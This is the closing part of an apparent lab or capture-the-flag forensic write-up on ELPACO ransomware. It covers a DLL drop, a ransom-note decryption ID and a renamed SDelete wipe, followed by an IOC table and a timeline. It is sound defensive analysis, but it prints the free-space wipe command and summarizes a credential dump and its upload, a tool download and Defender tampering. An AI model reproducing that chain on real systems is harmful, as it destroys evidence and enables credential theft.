+<p>This revealed multiple file creation events referencing the DLL, including the following locations:</p>
+<pre><code class="language-text">C:\Users\Administrator\AppData\Local\Temp\7ZipSfx.000\Everything32.dll
+
+C:\Users\Administrator\AppData\Local\BD3FDDDF-6CAF-3EBC-D9CF-C8DF72D8F78A\Everything32.dll
+</code></pre>
+<!-- Original Obsidian image reference: Pasted image 20261105153925.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/16.png" alt="Everything32.dll file creation events" loading="lazy">
+  <figcaption>Everything32.dll file creation events</figcaption>
+</figure>
+
+<p>These findings confirmed that <code>Everything32.dll</code> was deployed to the compromised workstation.</p>
+</div>
+    </section>
+    <!-- Q17 -->
+    <section class="task" id="q17">
+      <h3>Q17:</h3>
+      <div class="question-box"><p>The ransomware employs a comprehensive configuration setup. It uses a randomly generated specified decryption ID. What are the first 10 characters of the decryption ID?</p></div>
+      <div class="answer-block"><p>Continuing the investigation, I focused on identifying the <strong>decryption ID</strong> generated by the ransomware, which is used to associate the victim with their encrypted files and potential recovery information.</p>
+<p>Based on additional research, ELPACO ransomware stores the victim's decryption ID within a ransom note named <code>Decryption_INFO.txt</code>.</p>
+<p>To locate this file, I analyzed the parsed <strong>USN Journal</strong> using Timeline Explorer and filtered for <code>Decryption_INFO.txt</code>.</p>
+<p>The results revealed file system activity involving the ransom note beginning at:</p>
+<p><code>2024-12-13 23:51:38</code></p>
+<p>The file was located within the following directory:</p>
+<pre><code class="language-text">C:\Users\Administrator\AppData\Local\
+</code></pre>
+<!-- Original Obsidian image reference: Pasted image 20261105154627.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/17.png" alt="Decryption_INFO.txt in the USN Journal" loading="lazy">
+  <figcaption>Decryption_INFO.txt in the USN Journal</figcaption>
+</figure>
+
+<p>After identifying the file's location, I navigated to the directory and opened <code>Decryption_INFO.txt</code> to examine its contents.</p>
+<p>The ransom note confirmed that the victim's files had been encrypted and provided instructions for contacting the attackers to obtain a decryption tool.</p>
+<p>More importantly, the note contained a unique decryption ID assigned to the victim:</p>
+<pre><code class="language-text">BbvdsgAoTiYPteTQ8G5FCZEZ2TkSXikVxHzQlzNV2FE*mo4de1
+</code></pre>
+<!-- Original Obsidian image reference: Pasted image 20261105154657.png -->
+
+<figure class="image-block">
+  <img src="../assets/images/elpaco/18.png" alt="Decryption ID inside ransom note" loading="lazy">
+  <figcaption>Decryption ID inside ransom note</figcaption>
+</figure>
+.
+The presence of the ransom note, combined with the previously identified ransomware execution activity, provides further evidence that the malware reached its ransom-note deployment stage.
+
+<p>Extracting the first 10 characters of the decryption ID gives:</p>
+<p><strong>Answer:</strong> <code>BbvdsgAoTi</code></p>
+</div>
+    </section>
+    <!-- Q18 -->
+    <section class="task" id="q18">
+      <h3>Q18:</h3>
+      <div class="question-box"><p>The attacker used a tool to cover their tracks and prevent forensic analysis by overwriting data to prevent recovery. What is the official name of the tool the attacker used ?</p></div>
+      <div class="answer-block"><p>While reviewing the findings from previous questions, I noticed a suspicious command involving an executable named <code>xdel.exe</code>:</p>
+<pre><code class="language-cmd">&quot;C:\Users\Administrator\AppData\Local\BD3FDDDF-6CAF-3EBC-D9CF-C8DF72D8F78A\xdel.exe&quot; -accepteula -p 1 -c C:\
+</code></pre>
+<p>To investigate further, I returned to <strong>Sysmon Event ID 1 (Process Creation)</strong> and examined the executable's metadata and parent process information.</p>
+<p>The event revealed the following details:</p>
+<pre><code class="language-text">Timestamp:         2024-12-13 23:53:35.775 UTC
+Event ID:          1 (Process Creation)
+Process Name:      xdel.exe
+Process ID:        1188
+OriginalFileName:  sdelete.exe
+Product:           Sysinternals Sdelete
+Description:       Secure file delete
+File Version:      2.04
+Parent Process:    svhostss.exe
+Parent PID:        1220
+</code></pre>
+<p>Interestingly, although the executable was named <code>xdel.exe</code>, its embedded metadata identified it as <strong>Microsoft Sysinternals SDelete</strong>, a legitimate utility designed to securely delete files and overwrite free disk space.</p>
+<p>The command-line arguments further revealed its intended purpose:</p>
+<ul>
+<li><code>-accepteula</code> - Automatically accepts the Sysinternals license agreement.</li>
+<li><code>-p 1</code> - Specifies a single overwrite pass.</li>
+<li><code>-c</code> - Cleans free space on the specified volume.</li>
+<li><code>C:\</code> - Targets the C: drive.</li>
+</ul>
+<p>The <code>-c</code> parameter is particularly significant because it instructs SDelete to overwrite free disk space, potentially destroying recoverable remnants of previously deleted files and complicating forensic recovery.</p>
+<p>Additionally, the executable was launched by <code>svhostss.exe</code>, the previously identified ransomware process, directly linking this activity to the malicious execution chain.</p>
+</div>
+    </section>
+<hr class="section-divider">
+<section class="task" id="iocs"><h3>Indicators of Compromise (IOC)</h3><div class="table-wrap"><table class="ioc-table"><thead><tr><th>IOC Type</th><th>Indicator</th><th>Description</th></tr></thead><tbody>
+<tr><td>Source IP</td><td><code>10.10.10.55</code></td><td>Client IP associated with MSSQL authentication failures</td></tr>
+<tr><td>Tool-delivery endpoint</td><td><code>192.168.1.52:4561</code></td><td>HTTP server used in commands to download executable tools</td></tr>
+<tr><td>Victim host</td><td><code>ABOZ4HRA</code></td><td>Workstation where malicious processes were observed</td></tr>
+<tr><td>MSSQL executable</td><td><code>sqlservr.exe</code></td><td>Parent of suspicious OS command execution</td></tr>
+<tr><td>Ransomware dropper</td><td><code>oh_my_gotto.exe</code></td><td>Downloaded executable; PID 4224 when executed</td></tr>
+<tr><td>Dropper path</td><td><code>C:\Users\Administrator\AppData\Local\Temp\oh_my_gotto.exe</code></td><td>Initial downloaded payload</td></tr>
+<tr><td>SFX extraction directory</td><td><code>C:\Users\Administrator\AppData\Local\Temp\7ZipSfx.000\</code></td><td>Temporary malware extraction location</td></tr>
+<tr><td>Secondary stage</td><td><code>ELPACO-team.exe</code></td><td>Executable that launched svhostss.exe</td></tr>
+<tr><td>Ransomware executable</td><td><code>svhostss.exe</code></td><td>Masquerading process; PID 1220</td></tr>
+<tr><td>Secondary staging directory</td><td><code>C:\Users\Administrator\AppData\Local\BD3FDDDF-6CAF-3EBC-D9CF-C8DF72D8F78A\</code></td><td>Directory containing multiple malware components</td></tr>
+<tr><td>GUI process</td><td><code>gui40.exe</code></td><td>Ransomware GUI component; PID 5484</td></tr>
+<tr><td>Defender-interference tool</td><td><code>DC.exe</code></td><td>Executable associated with Defender-disabling activity</td></tr>
+<tr><td>File-search DLL</td><td><code>Everything32.dll</code></td><td>DLL observed in ransomware staging locations</td></tr>
+<tr><td>File-search DLL</td><td><code>Everything64.dll</code></td><td>Password-protected archive component referenced during extraction</td></tr>
+<tr><td>Credential tool</td><td><code>mimikatz.exe</code></td><td>Executable downloaded from attacker tool-delivery endpoint</td></tr>
+<tr><td>Credential dump file</td><td><code>C:\Mimikatz_dump.txt</code></td><td>Source of observed curl HTTP upload command</td></tr>
+<tr><td>Remote access tool</td><td><code>AnyDesk.exe</code></td><td>RMM software observed in process activity</td></tr>
+<tr><td>AnyDesk SHA256 prefix</td><td><code>FFF4B96876</code></td><td>First 10 characters of SHA256 as reported</td></tr>
+<tr><td>Persistence account</td><td><code>Reng0ku</code></td><td>Local account added to Administrators group</td></tr>
+<tr><td>Defender exclusion</td><td><code>C:\</code></td><td>Entire C: drive configured as antivirus exclusion</td></tr>
+<tr><td>Ransom note</td><td><code>Decryption_INFO.txt</code></td><td>Ransom note identified through USN activity</td></tr>
+<tr><td>Decryption ID</td><td><code>BbvdsgAoTiYPteTQ8G5FCZEZ2TkSXikVxHzQlzNV2FE*mo4de1</code></td><td>Victim-specific ID observed in ransom note</td></tr>
+<tr><td>Cleanup executable</td><td><code>xdel.exe</code></td><td>Renamed Sysinternals SDelete binary</td></tr>
+<tr><td>Original executable name</td><td><code>sdelete.exe</code></td><td>OriginalFileName in xdel.exe metadata</td></tr>
+<tr><td>Masqueraded file timestamp</td><td><code>2021-08-19 01:32:31 UTC</code></td><td>MFT creation timestamp for svhostss.exe</td></tr>
+</tbody></table></div></section>
+<hr class="section-divider">
+<section class="task" id="attack-timeline"><h3>Attack Timeline</h3><p>Times are UTC, based on timestamps explicitly documented in the investigation. Steps without recorded timestamps (such as local account creation) are included in the question-by-question write-up rather than assigned an invented time.</p><div class="table-wrap"><table class="ioc-table"><thead><tr><th>Timestamp (UTC)</th><th>Activity</th><th>Evidence / Observation</th></tr></thead><tbody>
+<tr><td>2024-12-13 22:52:46</td><td><code>MSSQL brute force</code></td><td>21 failed logins associated with client 10.10.10.55</td></tr>
+<tr><td>2024-12-13 22:52:47</td><td><code>Successful MSSQL login</code></td><td>Successful SQL Server authentication after failures</td></tr>
+<tr><td>2024-12-13 23:37:10</td><td><code>Defender exclusion attempt</code></td><td>SQL Server spawned command to exclude C:\</td></tr>
+<tr><td>2024-12-13 23:42:08</td><td><code>Remote access tooling</code></td><td>Earliest identified AnyDesk-related process activity</td></tr>
+<tr><td>2024-12-13 23:45:29</td><td><code>Credential tool download</code></td><td>PowerShell command to retrieve mimikatz.exe</td></tr>
+<tr><td>2024-12-13 23:46:36</td><td><code>Credential dump transfer attempt</code></td><td>curl -T command targeting C:\Mimikatz_dump.txt</td></tr>
+<tr><td>2024-12-13 23:47:03</td><td><code>Ransomware download</code></td><td>SQL Server descendant ran Invoke-WebRequest for oh_my_gotto.exe</td></tr>
+<tr><td>2024-12-13 23:48:42</td><td><code>Dropper execution</code></td><td>oh_my_gotto.exe executed with PID 4224</td></tr>
+<tr><td>2024-12-13 23:48:49</td><td><code>Ransomware process launched</code></td><td>ELPACO-team.exe launched svhostss.exe (PID 1220)</td></tr>
+<tr><td>2024-12-13 23:48:53</td><td><code>Ransomware GUI launched</code></td><td>svhostss.exe launched gui40.exe (PID 5484)</td></tr>
+<tr><td>2024-12-13 23:51:38</td><td><code>Ransom-note activity</code></td><td>First observed USN activity for Decryption_INFO.txt</td></tr>
+<tr><td>2024-12-13 ~23:51:45</td><td><code>Defender service tampering</code></td><td>MpCmdRun.exe -DisableService observed in proximity to DC.exe</td></tr>
+<tr><td>2024-12-13 23:53:35</td><td><code>Forensic artifact destruction attempt</code></td><td>xdel.exe (SDelete) invoked to wipe free space on C:\</td></tr>
+</tbody></table></div></section>
+  </main>
+</div>
+</body>
+</html>
